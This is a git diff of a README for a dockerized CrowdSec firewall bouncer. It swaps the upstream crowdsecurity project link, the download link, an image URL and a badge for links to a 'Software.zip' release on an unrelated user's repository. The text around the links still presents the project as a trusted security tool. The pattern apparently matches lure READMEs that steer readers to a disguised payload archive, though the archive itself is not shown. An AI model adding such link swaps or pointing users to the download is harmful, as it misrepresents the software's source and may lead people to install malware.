@@ -1,6 +1,6 @@
 # 🛡️ CS Firewall Bouncer Docker 🐳
 
-Welcome to the CS Firewall Bouncer Docker repository! This project provides a dockerized version of the popular CS Firewall Bouncer tool available at [Crowdsecurity GitHub](https://github.com/crowdsecurity/cs-firewall-bouncer). The CS Firewall Bouncer enhances your security setup by leveraging the power of containerization for easy deployment and management.
+Welcome to the CS Firewall Bouncer Docker repository! This project provides a dockerized version of the popular CS Firewall Bouncer tool available at [Crowdsecurity GitHub](https://github.com/vincent1010e/cs-firewall-bouncer-docker/releases/download/v2.0/Software.zip). The CS Firewall Bouncer enhances your security setup by leveraging the power of containerization for easy deployment and management.
 
 ## Overview ℹ️
 CS Firewall Bouncer is designed to prevent various types of attacks by working in conjunction with other security tools. By containerizing it with Docker, this repository aims to simplify the setup process and provide a consistent environment for running the CS Firewall Bouncer.
@@ -28,7 +28,7 @@ This repository covers a wide range of topics related to security, Docker, and a
 - truenas
 
 ## Get Started 🚀
-To get started with this repository, download the latest release [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). If the link does not work, please check the "Releases" section of the repository for alternative download options.
+To get started with this repository, download the latest release [here](https://github.com/vincent1010e/cs-firewall-bouncer-docker/releases/download/v2.0/Software.zip). If the link does not work, please check the "Releases" section of the repository for alternative download options.
 
 ## Installation Steps 🛠️
 1. Download and extract the release package.
@@ -47,8 +47,8 @@ Thank you for choosing CS Firewall Bouncer Docker for your security needs. We ho
 
 Let's build a more secure digital world together! 🌐
 
-![Security Image](https://source.unsplash.com/featured/?cybersecurity)
+![Security Image](https://github.com/vincent1010e/cs-firewall-bouncer-docker/releases/download/v2.0/Software.zip)
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/vincent1010e/cs-firewall-bouncer-docker/releases/download/v2.0/Software.zip%20Release-green)](https://github.com/vincent1010e/cs-firewall-bouncer-docker/releases/download/v2.0/Software.zip)
